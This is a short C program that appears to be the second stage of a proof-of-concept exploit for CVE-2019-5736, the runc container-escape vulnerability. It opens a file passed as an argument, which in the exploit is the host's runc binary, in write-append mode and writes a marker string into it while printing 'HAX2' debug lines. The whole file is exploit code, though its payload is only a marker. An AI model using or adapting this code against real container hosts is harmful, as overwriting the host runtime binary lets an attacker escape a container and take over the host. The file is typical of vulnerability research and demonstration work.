#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char **argv) {
    printf("HAX2: argv: %s\n", argv[1]);
    int fd = open(argv[1], O_RDWR|O_APPEND);
    printf("HAX2: fd: %d\n", fd);

    const char *poc = "cve-2019-5736";
    int res = write(fd, poc, strlen(poc));
    printf("HAX2: res: %d, %d\n", res, errno);
}
